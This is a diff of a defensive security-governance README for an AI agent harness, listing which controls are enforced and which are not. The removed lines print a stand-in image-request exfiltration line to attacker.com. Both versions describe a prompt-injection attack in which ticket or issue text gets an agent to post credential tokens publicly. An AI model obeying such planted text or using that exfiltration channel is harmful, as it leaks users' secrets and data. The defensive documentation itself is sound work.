@@ -1,129 +1,50 @@
 # Security & Safety (Spoke)
 > DAMA mapping: Data Security → Agent Security & Safety
 
-## Purpose
+## Governs
 
-Prevent the agent harness from becoming an exfiltration channel, a privilege escalation path, or an uncontrolled actor, while still enabling useful work under explicit constraints.
+- Untrusted content: the lethal trifecta and content source trust
+- Per-task least privilege and secret handling
+- Outbound destinations and exfiltration channels
+- Tool and MCP server adoption
+- Non-impersonation and epistemic honesty
+- Trust boundaries between agents
 
-## PCO Emphasis
+## Enforced
 
-- Policy: defines data classes, risk tiers, approvals, and disallowed actions
-- Control plane: enforces entitlements, brokering, sandboxing, and output controls
-- Observability: records security evidence, detects misuse, and supports forensics
+- Tool registry checks and the PCO hooks: see the [integration spoke](../integration/README.md) → Enforced. The
+  registry validator checks the file, not tool use.
+- Trifecta separation (§1), per-task privilege decomposition and secret brokering (§2), tool/MCP trust assessment
+  (§4), non-impersonation (§5), epistemic honesty (§6), External Research (Bounded) and Multi-Agent Trust: human
+  review against
+  [security-threat-model.md](../ai_harness/rules/security-threat-model.md).
 
-## Scope (what this spoke governs)
+## Not enforced
 
-### Confidentiality and access control
+- Use of an unregistered tool or MCP server: required by [lineage.md](../ai_harness/rules/lineage.md) →
+  Registries and Versioning; no PCO check (see the integration spoke → Not enforced).
+- Outbound allowlisting for runtime agents: required by security-threat-model.md → §3; no PCO check. The control
+  plane that maintains the allowlists: target, not implemented.
+- Outbound allowlisting for coding sessions: no sandbox and no `permissions.deny` in `settings.json`. Target, not
+  implemented (outside §3's scope).
+- Content source registration for High/Critical solutions and blocking of Prohibited sources: required by
+  security-threat-model.md → §1; no PCO check.
+- Secrets kept out of logs, telemetry, traces, run evidence and commits: required by security-threat-model.md → §2 and
+  AGENTS.md → Security; no PCO check (no secret scanning).
+- Data residency and access recertification: required by
+  [ENTERPRISE_OBLIGATIONS.md](../governance/ENTERPRISE_OBLIGATIONS.md) → Data Residency / Sovereignty /
+  Cross-Border Transfer and Procurement & Access Lifecycle; no PCO check.
 
-- Least-privilege tool access per role and per risk tier
-- Secrets management and brokering (no secrets in prompts/logs)
-- Project and environment boundaries
+## Rules
 
-### Integrity and safe execution
+- [security-threat-model.md](../ai_harness/rules/security-threat-model.md)
+- [ENTERPRISE_OBLIGATIONS.md](../governance/ENTERPRISE_OBLIGATIONS.md) → Data Residency / Sovereignty /
+  Cross-Border Transfer; Procurement & Access Lifecycle
 
-- Sandbox policies for tools that can mutate state
-- Prevention of unauthorised or unreviewed changes
-- Supply-chain hygiene for dependencies and tool plugins
+## Canonical
 
-### Safety and misuse resistance
+### AgentFlayer
 
-- Prompt injection and tool abuse prevention
-- Data exfiltration controls (network egress, content filters)
-- Human-in-the-loop approvals for high-risk actions
-
-## Governance Controls (hub decisions)
-
-### Data classification for agent-accessible inputs
-
-Governance defines:
-- Data classes (public/internal/confidential/restricted)
-- Which classes may be exposed to which workflows and roles
-- Redaction and minimisation requirements
-
-### Entitlement model
-
-Governance defines:
-- Role × tool × environment entitlements
-- Conditions for elevation (approvals, time-bounded access)
-- Audit requirements for sensitive actions
-
-### High-risk action policy
-
-Governance defines what is disallowed vs allowed with approvals, including:
-- Network egress and external calls
-- Accessing credential stores
-- Writing to production systems or privileged repositories
-
-## Artefacts and Surfaces (examples)
-
-- Data classification policy and handling rules
-- Tool entitlement matrix (role × tool × environment × risk tier)
-- Secret handling standard (brokering, rotation, logging restrictions)
-- Prompt injection test suite and adversarial scenarios
-- Approval and escalation playbooks (who approves what, with what evidence)
-
-## Enforcement Points (where the control plane enforces)
-
-### Pre-run
-
-- Tool entitlements validated for the role and risk tier
-- Sensitive tools require approval tokens or explicit approvals
-- Environment sandbox selection based on risk
-
-### In-run
-
-- Secret brokering at execution time (no secrets in prompts)
-- Network egress control (allowlist/denylist) where applicable
-- Output controls and redaction for logs and evidence
-- Tool call validation and policy checks (blocking)
-
-### Post-run
-
-- Security event logging and anomaly detection
-- Evidence retention and access control enforcement
-- Review triggers for suspected policy violations
-
-## Evidence and Metrics (what observability measures)
-
-- Tool denial events and attempted policy violations
-- Prompt injection detection rate and failure cases
-- Secrets exposure incidents (target: zero) and near misses
-- Unauthorised egress attempts and blocked calls
-- Approval volume, latency, and exception expiry compliance
-
-## Enforcement Rules
-
-Canonical enforcement: [security-threat-model.md](../ai_harness/rules/security-threat-model.md)
-
-Covers: the **Lethal Trifecta** (sensitive data + untrusted content + external communication),
-six required controls (content source trust classification, per-task least-privilege decomposition,
-external destination allowlisting, tool/MCP trust assessment, non-impersonation, epistemic honesty),
-and multi-agent trust boundaries. The named attack patterns are below; the agent behaviour failure
-taxonomy is in the [behaviour spoke](../behaviour/README.md).
-
-Data-handling & access lifecycle: every data source and model endpoint declares its processing
-region and permitted transfer scope, and a source or model whose region is undeclared or outside
-policy is non-conformant ([ENTERPRISE_OBLIGATIONS.md](../governance/ENTERPRISE_OBLIGATIONS.md));
-access is provisioned by named identity and recertified on a schedule (same doc).
-
-## Named Attack Patterns
-
-**AgentFlayer**: malicious content in Jira tickets / GitHub issues requests credential tokens
-and instructs the agent to post results as public comments. Requires no code execution —
-the attack is entirely data-driven through crafted text.
-
-**Image exfiltration**: `GET https://attacker.com/img.png?data=[stolen]` exfiltrates data
-via request parameters. Even read-only HTTP access enables this. Allowing arbitrary image
-loading is an exfiltration channel.
-
-**MCP supply chain**: hosted MCP servers may silently exfiltrate data to third parties.
-Unmaintained or maliciously authored plugins introduce traditional supply-chain vectors.
-
-## Common Failure Modes
-
-- Convenience shortcuts: secrets passed through prompts or stored in logs
-- Over-broad tool access granted "temporarily" and not revoked
-- Unbounded network egress enabling accidental disclosure
-- Treating injection defence as a one-time hardening exercise
-- Processing untrusted external content in the same session as credential access
-- Adopting MCP servers without trust assessment
+Malicious text in a Jira ticket or GitHub issue asks the agent for credential tokens and tells it to post them as a
+public comment. It needs no code execution: the attack is carried entirely by crafted text, which is why §1 treats
+every untrusted source as data.
